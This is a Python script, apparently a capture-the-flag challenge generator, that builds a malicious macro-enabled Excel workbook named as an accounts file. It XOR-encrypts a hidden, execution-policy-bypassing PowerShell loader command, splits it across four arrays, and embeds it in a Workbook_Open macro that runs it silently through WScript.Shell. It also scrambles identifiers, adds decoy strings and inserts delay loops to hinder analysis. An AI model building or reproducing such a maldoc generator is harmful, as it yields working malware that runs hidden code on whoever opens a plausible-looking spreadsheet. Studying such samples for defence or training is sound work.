from string import ascii_letters
import random
import win32com.client as win32
from base64 import b64encode
import sys


DEBUG = "DEBUG" in sys.argv

KEY = "l4ng0gm3g3th3mm3l1gk3y"


def encrypt(msg, key):
    return [(ord(c) ^ ord(key[i % len(key)]) ^ i) % 256 for i, c in enumerate(msg)]


def obfuscate(code):
    code = code.replace("    ", "").replace("\n\n", "\n")
    code = "\n".join([line for line in code.split("\n") if not line.startswith("Debug")])

    replacements = {"SecretGen": "", "setKey": "", "key": ""}
    for line in code.split("\n"):
        tokens = line.split()
        if len(tokens) == 0:
            continue

        if tokens[0] == "Dim":
            replacements[tokens[1]] = ""
        elif tokens[0] == "Function":
            replacements[tokens[1].split("(")[0]] = ""
            params = line.replace("(", ",").replace(")", ",").split(",")
            for param in params[1:-1]:
                replacements[param.split()[0]] = ""

    for to_replace in sorted(replacements, key=len, reverse=True):
        replacements[to_replace] = "".join(random.sample(ascii_letters, 10))
        code = code.replace(to_replace, replacements[to_replace])
    
    return code, replacements


def vba_array_fit(arr):
    result = ", ".join(arr[:100])
    for i in range(1, (len(arr) // 100) + 1):
        result += ", _\n" + ", ".join(arr[100 * i:100 * (i + 1)])
    return result


def gen_chall(vba_code, replacements=None):
    # Generate Excel sheet
    xl = win32.gencache.EnsureDispatch('Excel.Application')
    xl.Visible = False
    workbook = xl.Workbooks.Add()

    # Generate secret-generation module
    xlmodule = workbook.VBProject.VBComponents.Add(1)
    xlmodule.name = replacements["SecretGen"] if not DEBUG else "SecretGen"
    secret_code = f"""Public key As String
Public Sub setKey()
    key = "{KEY}"
End Sub"""
    if not DEBUG:
        secret_code = secret_code.replace("    ", "")
        for to_replace in sorted(replacements, key=len, reverse=True):
            secret_code = secret_code.replace(to_replace, replacements[to_replace])

    xlmodule.CodeModule.AddFromString(secret_code)

    # Generate main challenge module
    xlmodule = workbook.VBProject.VBComponents(workbook.CodeName)
    xlmodule.CodeModule.AddFromString(vba_code)

    xl.DisplayAlerts = False
    workbook.RemoveDocumentInformation(99)  # Remove all personal info
    workbook.SaveAs("regnskab.xlsm", FileFormat=52)  # File with macros enabled
    xl.Workbooks(1).Close(SaveChanges=1)
    xl.Application.Quit()


vba_script = ""

if DEBUG:
    vba_script += "Declare PtrSafe Sub Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long)\n\n"

vba_script += """Function Decrypt(msg As Variant)
    Dim output As String

    Dim idx
    For idx = 0 To UBound(msg)
        output = output + Chr((msg(idx) Xor Asc(Mid(key, (idx Mod Len(key)) + 1, 1)) Xor idx) Mod 256)
    Next idx
    Dim tmp1
    tmp1 = "AAiA3b4pSQo984="
    Decrypt = output
End Function
    
Private Sub Workbook_Open()
    Call SecretGen.setKey

    Dim tmp2
    tmp2 = "bpiSQIQdsjkpQ"

    Dim idx1
    For idx1 = 0 to 32
        If idx1 < 20 Then DoEvents
    Next idx1
    
    Dim enc_ps_cmd1
    enc_ps_cmd1 = Array({})
    Dim ps_cmd1
    ps_cmd1 = Decrypt(enc_ps_cmd1)

    Dim tmp3
    tmp3 = "lkljkh9y893AAAW=="

    Dim enc_ps_cmd2
    enc_ps_cmd2 = Array({})
    Dim ps_cmd2
    ps_cmd2 = Decrypt(enc_ps_cmd2)

    Dim idx2
    For idx2 = 0 to 64
        If idx2 < 30 Then DoEvents
    Next idx2

    Dim enc_ps_cmd3
    enc_ps_cmd3 = Array({})
    Dim ps_cmd3
    ps_cmd3 = Decrypt(enc_ps_cmd3)

    Dim tmp4
    tmp4 = "Af679ads8a78Kg="

    Dim enc_ps_cmd4
    enc_ps_cmd4 = Array({})
    Dim ps_cmd4
    ps_cmd4 = Decrypt(enc_ps_cmd4)

    Dim tmp5
    tmp5 = "wA87rTUqwSvghh1="

    Dim ps_cmd
    ps_cmd = ps_cmd1 & ps_cmd2 & ps_cmd3 & ps_cmd4
    Debug.print ps_cmd

    Dim shell
    Set shell = CreateObject("WScript.Shell")
"""
if DEBUG:
    vba_script += """
    Dim shellExec
    Set shellExec = shell.Exec(ps_cmd)

    While shellExec.Status = 0
        Sleep 100
        Debug.print "Running..."
    Wend

    Dim output
    If shellExec.ExitCode = 1 Then
        output = shellExec.StdErr.ReadAll
        Debug.print "Failed!"
    Else
        output = shellExec.StdOut.ReadAll
        Debug.print "Success!"
    End If

    Debug.print output
    Debug.print "Done!"
"""
else:
    vba_script += """
    shell.Run ps_cmd, 0, true
"""
vba_script += "End Sub"

with open("obfuscated-powershell-loader.ps1") as f:
    ps_script = f.read().strip()

def main():
    ps_cmd = "powershell.exe -ExecutionPolicy Bypass "
    if not DEBUG:
        ps_cmd += "-NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "
    ps_cmd += "-e " + b64encode(ps_script.encode("utf-16-le")).decode()

    block_size = len(ps_cmd) // 4

    enc_ps_cmd1 = [*map(str, encrypt(ps_cmd[:block_size], KEY))]
    formatted_cmd1 = vba_array_fit(enc_ps_cmd1)

    enc_ps_cmd2 = [*map(str, encrypt(ps_cmd[block_size:block_size * 2], KEY))]
    formatted_cmd2 = vba_array_fit(enc_ps_cmd2)

    enc_ps_cmd3 = [*map(str, encrypt(ps_cmd[block_size * 2:block_size * 3], KEY))]
    formatted_cmd3 = vba_array_fit(enc_ps_cmd3)

    enc_ps_cmd4 = [*map(str, encrypt(ps_cmd[block_size * 3:], KEY))]
    formatted_cmd4 = vba_array_fit(enc_ps_cmd4)

    vba_code = vba_script.format(formatted_cmd1, formatted_cmd2, formatted_cmd3, formatted_cmd4)
    replacements = None
    if not DEBUG:
        vba_code, replacements = obfuscate(vba_code)

    print(vba_code)
    gen_chall(vba_code, replacements)


if __name__ == "__main__":
    main()
